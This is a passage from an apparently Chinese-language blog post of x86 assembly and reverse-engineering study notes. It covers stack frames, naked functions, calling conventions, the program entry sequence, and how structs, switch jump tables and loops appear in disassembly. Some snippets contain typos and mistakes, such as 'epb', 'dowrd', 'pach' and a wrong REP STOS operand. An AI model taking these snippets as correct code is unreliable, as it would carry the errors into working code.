class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>], <span class="number">0xBBBBBBBB</span></span><br></pre></td></tr></table></figure>

<p>专用栈：<br>ESP 栈顶<br>EBP 栈底<br>PUSH、POP 只能是16位或32位<br>栈顶指针移动的偏移量，如果是立即数，则偏移4，如果是容器，则偏移容器大小（push ax，偏移2个）</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="number">0x12345678</span>   <span class="comment">; 立即数，寄存器，内存</span></span><br><span class="line"><span class="keyword">POP</span>  <span class="built_in">eax</span>          <span class="comment">; 寄存器，内存</span></span><br><span class="line"><span class="keyword">PUSHAD</span> <span class="comment">; 存入所有寄存器</span></span><br><span class="line"><span class="keyword">POPAD</span>  <span class="comment">; 弹出所有寄存器</span></span><br></pre></td></tr></table></figure>

<h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p>0  CF：进位借位标志寄存器<br>2  PF：结果中1的个数是不是偶数<br>4  AF：辅助进位标志（32位时看16位是否进位，16位时看8位是否进位）<br>6  ZF：零标志位，判断结果是否为0<br>7  SF：符号标志，计算结果的最高位<br>8  TF：<br>9  IF：<br>10 DF：方向标志，<br>11 OF：溢出标志位</p>
<h3 id="堆栈图"><a href="#堆栈图" class="headerlink" title="堆栈图"></a>堆栈图</h3><p>栈是由高地址向低地址生长。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 传入参数</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="number">1</span>    <span class="comment">; 也可以通过寄存器传入</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="number">2</span></span><br><span class="line"><span class="comment">; 调用</span></span><br><span class="line"><span class="keyword">CALL</span> <span class="number">0x40</span>  <span class="comment">; EIP 会变化，返回地址入栈（ESP）</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">ESP</span>, <span class="number">8</span> <span class="comment">; 去掉调用的参数（在函数外平衡堆栈，外平栈）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 0x40 程序，Debug 版本</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">EBP</span>      <span class="comment">; 旧栈栈底入栈，作为新栈第0号元素</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">EBP</span>, <span class="built_in">ESP</span>  <span class="comment">; 创建新栈，新栈底存存放旧栈栈底地址</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">ESP</span>, <span class="number">40</span>   <span class="comment">; 生成缓冲区，大小不确定</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">EBX</span>      <span class="comment">;  </span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">ESI</span>      <span class="comment">; </span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">EDI</span>      <span class="comment">; 保存寄存器现场</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span> - <span class="number">40</span>]<span class="comment">; 将第1个缓冲区地址放入EDI</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ECX</span>, <span class="number">10</span>   <span class="comment">; 设置循环次数</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">EAX</span>, <span class="number">0xCCCCCCCC</span>             <span class="comment">; 赋值，CC是INT3，表示断点，防止缓冲区溢出</span></span><br><span class="line"><span class="keyword">REP</span> STOS <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span> + <span class="number">8</span>] <span class="comment">; 缓冲区全部赋值为EAX</span></span><br><span class="line"><span class="comment">; 程序主要部分</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span> + <span class="number">8</span>] <span class="comment">; 使用第1个参数</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span> + C] <span class="comment">; 使用第2个参数</span></span><br><span class="line"><span class="comment">; 返回部分</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">EDI</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">ESI</span>  </span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">EBX</span>       <span class="comment">; 恢复现场</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ESP</span>, <span class="built_in">EBP</span>  </span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">EBP</span>       <span class="comment">; 弹出旧栈</span></span><br><span class="line"><span class="keyword">RETN</span>          <span class="comment">; 返回值在EAX中</span></span><br></pre></td></tr></table></figure>

<h3 id="Windows-堆栈"><a href="#Windows-堆栈" class="headerlink" title="Windows 堆栈"></a>Windows 堆栈</h3><ol>
<li>先进后出</li>
<li>向低地址扩展</li>
</ol>
<h3 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h3><p>编译器完全不管的函数。由CALL调用后跳转到函数中，函数没有任何汇编代码，全部都是INT3。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) Plus()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C语言里面也可以加入汇编。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) Plus()</span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;  <span class="comment">// _asm 也可以</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) Plus(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123; </span><br><span class="line">        <span class="comment">// 提升堆栈</span></span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0x40</span></span><br><span class="line">        <span class="comment">// 保留现场</span></span><br><span class="line">        push ebx</span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        <span class="comment">// 填充缓冲区</span></span><br><span class="line">        mov eax, <span class="number">0xCCCCCCCC</span></span><br><span class="line">        mov ecx, <span class="number">0x10</span></span><br><span class="line">        lea edi, dword ptr ds:[epb - <span class="number">0x40</span>]</span><br><span class="line">        rep stosd</span><br><span class="line">        <span class="comment">// 主要功能</span></span><br><span class="line">        mov eax, dword ptr ds:[ebp + <span class="number">0x8</span>]</span><br><span class="line">        add eax, dword ptr ds:[ebp + <span class="number">0xC</span>]</span><br><span class="line">        <span class="comment">// 恢复现场</span></span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        pop ebx</span><br><span class="line">        <span class="comment">// 恢复堆栈</span></span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__declspec</code>关键字用法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 规定内存对齐的位置，不规定占用的长度</span></span><br><span class="line"><span class="comment">// #pragma pack() 规定内存对齐的最小值</span></span><br><span class="line">__declspec(align(<span class="number">32</span>)) </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span> <span class="type">int</span> a, b, c &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明数据段的一个数据项</span></span><br><span class="line"><span class="comment">// 与 #pragma code_seg, const_seg, data_seg, section, init_seg 配合使用</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;share_data&quot;</span>)</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg() __declspec(allocate(<span class="string">&quot;share_data&quot;</span>)) int c = 1;</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;share_data&quot;</span>)) <span class="type">int</span> d;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL调用与输出</span></span><br><span class="line"><span class="comment">// 输出端</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> ___<span class="title">declspec</span>(<span class="title">dllexport</span>)</span></span><br><span class="line"><span class="class"><span class="title">DllExport</span>&#123;</span>  </span><br><span class="line">    DllExport()&#123;&#125;;</span><br><span class="line">    ~DllExport()&#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 输入端</span></span><br><span class="line"><span class="meta">#import comment(lib, <span class="string">&quot;dll_name.lib&quot;</span>)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> ___<span class="title">declspec</span>(<span class="title">dllimportt</span>)</span></span><br><span class="line"><span class="class"><span class="title">DllExport</span>&#123;</span>  </span><br><span class="line">    DllExport()&#123;&#125;;</span><br><span class="line">    ~DllExport()&#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 裸函数</span></span><br><span class="line"><span class="comment">// 仅在x86中有效，仅对函数有效</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) func()&#123;</span><br><span class="line">    __asm &#123; ret &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// selectany</span></span><br><span class="line"><span class="comment">// 允许在.h文件中创建全局变量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line">public:</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count;</span><br><span class="line">&#125;</span><br><span class="line">__declspec(selectany) <span class="type">int</span> Stu::count = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>


<h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>有如下调用约定，规定参数的传递，返回值的传递。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>     <span class="comment">// C/C++默认，从右向左压入参数，外平栈</span></span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>   <span class="comment">// WIN32 API，从右向左压入参数，内平栈</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>  <span class="comment">// ECX/EDX存入前两个，其他的从右向左压入，内平栈</span></span><br></pre></td></tr></table></figure>

<h3 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h3><p>控制台程序中，C语言程序运行后，函数堆栈如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main(<span class="type">int</span> <span class="number">1</span>, <span class="type">char</span>**)   <span class="comment">// 编程入口</span></span><br><span class="line">mainCRTStartup()      <span class="comment">// 真正的入口，Link-&gt;Output-&gt;Entry-point symbol中规定</span></span><br><span class="line">KERNEL32! <span class="number">7</span>c816d4f()  <span class="comment">// </span></span><br></pre></td></tr></table></figure>

<p><code>mainCRTStartup()</code>函数在<code>main()</code>之前先初始化：</p>
<ol>
<li>获取系统版本    GetVersion()</li>
<li>堆初始化        _heap_init()</li>
<li>获取命令行参数  GetCommandLineA()</li>
<li>获取环境变量    _crtGetEnvironmentStringA()</li>
<li>设置参数       _setargv()</li>
<li>设置环境PATH   _setenvp()</li>
<li>初始化C        _cinit()</li>
<li>调用<code>main(__argc, __argv, _environ)</code></li>
</ol>
<p>找Main方法，就是去找3个参数的方法。例如：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">edx</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">CALL</span> ...</span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">esp</span>, <span class="number">0xC</span></span><br></pre></td></tr></table></figure>

<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>四种数据类型：</p>
<ol>
<li>基本类型：整数，浮点</li>
<li>构造类型：数组，结构体，联合体</li>
<li>指针类型</li>
<li>空类型：void</li>
</ol>
<p>有符号的和无符号的数存放方式一样，在使用时候才会区分。一般是类型转换，比较大小，数学运算中会区别使用。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 内存对齐</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], 0xFFh   <span class="comment">; 有符号无符号存储时都一样</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [epb - <span class="number">8</span>], 0xFFh</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">0xC</span>], 0xFFh</span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 比较有符号数</span></span><br><span class="line"><span class="keyword">JLE</span> </span><br><span class="line"><span class="comment">; 比较无符号数</span></span><br><span class="line"><span class="keyword">JBE</span> </span><br></pre></td></tr></table></figure>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>传入参数<br>传参时，由于使用PUSH，因此不论是何种类型，一律是传入32位数据。</p>
<p>返回值<br>一般情况下，返回值放到EAX中，如果是64位数据，则高位放到EDX，低位放到EAX中。</p>
<p>局部变量<br>一般直接分配32位的整数倍，不论是char，short还是int。</p>
<p>数组<br>一般是按照32位的整数倍为数组分配空间。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> x[<span class="number">5</span>];  <span class="comment">// 占8字节</span></span><br></pre></td></tr></table></figure>

<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>如果遇到连续赋值，但内存单元不是等宽，那么很有可能是结构体。<br>传参数传递结构体时，将结构体复制到栈里面。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SUB</span> <span class="built_in">esp</span>, <span class="number">18h</span>          <span class="comment">; 结构体大小</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="number">6</span>            <span class="comment">; 复制次数</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">esi</span>, [<span class="built_in">ebp</span> - <span class="number">18h</span>]  <span class="comment">; 复制开始的地址  ESI</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edi</span>, <span class="built_in">esp</span>          <span class="comment">; 子程序栈上  EDI </span></span><br><span class="line"><span class="keyword">REP</span> MOVS <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>], <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]  <span class="comment">; 复制</span></span><br></pre></td></tr></table></figure>

<p>做函数返回值时候，主函数首先创建缓冲区<code>LEA eax, [ebp-30h]</code>，之后<code>PUSH eax</code>，也就是将缓冲区地址传入子程序中。但是在函数执行完后，还要将数据从缓冲区复制到自己的局部变量里面。</p>
<p>结构体要数组对齐。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pach(n)  <span class="comment">// 自定义对齐</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack()   <span class="comment">// 恢复默认对齐</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Sizeof"><a href="#Sizeof" class="headerlink" title="Sizeof"></a>Sizeof</h3><p>Sizeof是一个关键字，用于获取类型大小，结构体大小，数组占的内存大小。</p>
<h3 id="内存图"><a href="#内存图" class="headerlink" title="内存图"></a>内存图</h3><p>内存区域：</p>
<ol>
<li>代码区：可读，可执行</li>
<li>栈：参数，局部变量，临时数据</li>
<li>堆</li>
<li>全局变量：可读写</li>
<li>常量：可读</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 全局变量特点：</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="number">0x00427320</span>], <span class="built_in">eax</span>   <span class="comment">; 直接写到某个地址</span></span><br><span class="line"><span class="comment">; 局部变量特点：</span></span><br><span class="line"><span class="keyword">mov</span> dwprd <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="built_in">eax</span>      <span class="comment">; 基址加偏移</span></span><br></pre></td></tr></table></figure>

<h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><p>IF 语句<br>当遇到CMP&#x2F;TEST等影响标志位的命令，之后紧接JCC，则为IF。<br>汇编中和C语言中一般是反过来的。汇编中，如果满足条件则跳出；C语言中，如果满足条件则执行。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; IF</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">eax</span>, dowrd <span class="built_in">ptr</span> [epb + <span class="number">0xC</span>]</span><br><span class="line"><span class="keyword">JLE</span> <span class="number">0x00401049</span>  <span class="comment">; JMP 的下一行代码地址</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="comment">; ELSE</span></span><br><span class="line"><span class="keyword">JMP</span> <span class="number">0x00401060</span>  <span class="comment">; IF 语句的结束位置</span></span><br><span class="line"><span class="comment">; ...</span></span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; IF (a &gt; 1 &amp;&amp; b &gt; 1 &amp;&amp; c &gt; 1)</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="comment">; 条件 1</span></span><br><span class="line"><span class="keyword">JLE</span> <span class="comment">; 复合条件 则继续判断；否则跳到结尾</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="comment">; 条件 2</span></span><br><span class="line"><span class="keyword">JLE</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="comment">; 条件 3</span></span><br><span class="line"><span class="keyword">JLE</span></span><br><span class="line"><span class="comment">; 结尾</span></span><br></pre></td></tr></table></figure>

<p>SWITCH 语句</p>
<ol>
<li>当情况数较少时候（2 Cases + Default）实现和IF一样。</li>
<li>当情况数较多时候（4个分支时候），则生成大情况表。它会将每一个分支地址都存到大表中，然后通过给定的参数直接计算分支的地址直接跳转。<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SUB</span> <span class="built_in">ecx</span>, <span class="number">01h</span>   <span class="comment">; 将传入的参数减 Case 1</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="built_in">ecx</span>  </span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="number">3</span>    <span class="comment">; 1 与 3 比较</span></span><br><span class="line"><span class="keyword">JA</span>  xxx                       <span class="comment">; 跳转到 Default</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, dowrd <span class="built_in">ptr</span> [epb - <span class="number">4</span>]  <span class="comment">; 将 1 放到 edx</span></span><br><span class="line"><span class="keyword">JMP</span> dowrd <span class="built_in">ptr</span> [<span class="built_in">edx</span> * <span class="number">4</span> + @ Case <span class="number">1</span>]  <span class="comment">; 依据表得到跳转地址</span></span><br></pre></td></tr></table></figure></li>
<li>当 CASE 值连续相近时，才采取情况2的方式，如果中间断了一两个，那么空缺的地方则填入Default；如果 CASE 值混乱，则使用情况1方式。</li>
<li>当 CASE 值不太连续相近，但是又不够混乱时（例如CASE 字母），还会生产小表（CASE值转偏移值的表），之后通过小表查找偏移量，进一步再去查询大表（存放分支地址的表），此时大表中为连续的，不必插入Default。<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SUB</span> <span class="built_in">ecx</span>, <span class="number">01h</span>   <span class="comment">; 将传入的参数减 Case 1</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="built_in">ecx</span>  </span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="number">3</span>    <span class="comment">; 1 与 3 比较</span></span><br><span class="line"><span class="keyword">JA</span>  xxx                       <span class="comment">; 跳转到 Default</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, dowrd <span class="built_in">ptr</span> [epb - <span class="number">4</span>]  <span class="comment">; 将 1 放到 edx</span></span><br><span class="line"><span class="comment">; 新增</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">edx</span>, <span class="built_in">edx</span>                        <span class="comment">; 清空 edx</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dl</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + 表开始地址]  <span class="comment">; 查询小表</span></span><br><span class="line"><span class="keyword">JMP</span> dowrd <span class="built_in">ptr</span> [<span class="built_in">edx</span> * <span class="number">4</span> + @ Case <span class="number">1</span>]  <span class="comment">; 依据小表得到大表中的跳转地址</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>do while性能最好。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span>  <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]    <span class="comment">; Start</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">eax</span>                         <span class="comment">; 调用函数的参数</span></span><br><span class="line"><span class="keyword">PUSH</span> offset string</span><br><span class="line"><span class="keyword">CALL</span> printf                      <span class="comment">; 调用函数</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">esp</span>, <span class="number">8</span>                       <span class="comment">; 外平栈</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]     <span class="comment">; x++</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">ecx</span>, <span class="number">1</span>                       <span class="comment">; x++</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>], <span class="built_in">ecx</span>     <span class="comment">; 判断计次变量</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]</span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + 0xCh]</span><br><span class="line"><span class="keyword">JG</span>  Start </span><br></pre></td></tr></table></figure>

<p>While语句：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]      <span class="comment">; Start</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + 0xCh]</span><br><span class="line"><span class="keyword">JGE</span> End                           <span class="comment">; 判断是否复合条件</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]      <span class="comment">; 传入参数</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">PUSH</span> offset string</span><br><span class="line"><span class="keyword">CALL</span> printf                       <span class="comment">; 调用函数</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">esp</span>, <span class="number">8</span>                        <span class="comment">; 外平栈</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span 